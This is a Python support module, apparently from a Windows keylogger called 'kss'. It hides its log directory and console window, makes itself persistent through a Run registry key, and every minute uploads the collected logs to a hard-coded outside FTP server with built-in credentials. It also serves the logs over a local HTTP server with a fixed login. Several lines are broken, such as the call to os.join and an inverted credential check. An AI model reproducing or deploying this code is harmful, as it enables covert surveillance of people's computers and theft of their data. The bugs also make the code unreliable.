import socket
import os
import datetime
import netifaces
import winreg
import time
from sync_ftp import SyncFtp
import http.server
import base64
import socketserver
import platform

# get the user name as identifier
def user_name():
    return os.getenv("USERNAME")

# get the current date and time as a string
def current_time():
    return datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')

#For creating app dir
def dir_path():
    home_path = os.path.expanduser("~")
    dir_name = "kss"
    app_root = os.path.join(home_path, dir_name)
    dir_path = os.path.join(app_root, user_name())
    if not os.path.exists(dir_path):
        os.makedirs(dir_path)
    os.chdir(dir_path)
    os.system(f"attrib +h /s /d {app_root}") 
    return dir_path

# #this hide function help to minimize the console
def hide_console():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def add_startup():
    pth = os.path.dirname(os.path.realpath(__file__))
    s_name="kss.py"    
    address=os.join(pth,s_name) 
    key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = winreg.OpenKey(key,key_value,0,winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(open,"kss",0,winreg.REG_SZ,address)
    winreg.CloseKey(open)

# check if internet is connected or not
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False
    
# Define a function to get the name of an interface from its GUID
def get_interface_name(guid):
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
    try:
        subkey = winreg.OpenKey(key, guid + r'\Connection')
        try:
            name = winreg.QueryValueEx(subkey, 'Name')[0]
            return name
        except FileNotFoundError:
            return None
    except FileNotFoundError:
        return None

#Getting current active network interface
def active_interface():
    if(platform.system() == "Windows"):
        active_interface = get_interface_name(netifaces.gateways()['default'][netifaces.AF_INET][1])
    else:
        active_interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    return active_interface

# Upload log directory to ftp server
def sync(host,username,passward):
    if not host or username or passward:
        print("No input found for Ftp. Login with default. \n ")
    if not host:
        host = "20.124.217.64"
    if not username:
        username="zlogger" 
    if not passward:
        passward="zlogger"
    home_path = os.path.expanduser("~")
    dir_list = os.listdir(home_path)
    if "kss" in dir_list:
        source_path = os.path.join(home_path, "kss")
        target_path = "/var/www/html/"

    SYNC = SyncFtp(host, username, passward)
    
    while True:
        if is_connected() == True:
            print("Internet is available. Syncing to the ftp.. \n ")
            try:
                SYNC.send_to_ftp(source_path, target_path)
            except KeyboardInterrupt:
                exit(0)
        else:
            print("No internet! Checking for internet connectivity.. \n ")
        time.sleep(60)

#Creating local server
class AuthHandler(http.server.SimpleHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_GET(self):
        auth_header = self.headers.get("Authorization")
        if auth_header is None:
            self.send_response(401)
            self.send_header("WWW-Authenticate", "Basic realm=\"Test\"")
            self.end_headers()
            return
        auth_parts = auth_header.split()
        if len(auth_parts) != 2 or auth_parts[0] != "Basic":
            self.send_error(400, "Bad request")
            return
        username, password = base64.b64decode(auth_parts[1]).decode().split(":")
        if username != "kss" or password != "kss":
            self.send_error(403, "Forbidden")
            return
        super().do_GET()

def server():
    PORT = 8000
    DIRECTORY = "./"
    with socketserver.TCPServer(("", PORT), AuthHandler) as httpd:
        print("Local server running at http://localhost:8000 default username and passward is: 'kss' \n ")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            exit(0)
